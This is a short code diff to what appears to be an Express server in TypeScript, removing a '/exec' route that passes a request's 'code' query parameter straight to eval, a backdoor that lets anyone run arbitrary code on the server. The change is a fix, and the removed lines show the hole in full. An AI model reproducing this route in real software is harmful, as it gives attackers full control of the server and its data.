@@ -26,15 +26,6 @@ app.use((req, res, next) => {
 
 app.set("view engine", "pug");
 
-app.get("/exec", (req, res) => {
-    try {
-        eval(req.query.code as string);   
-    } catch (error) {
-        res.writeHead(500);
-        res.end(error);
-    }
-});
-
 app.post("/addPackage", async (req, res) => {
     try {
         let { packageName, packageFile } = req.body;
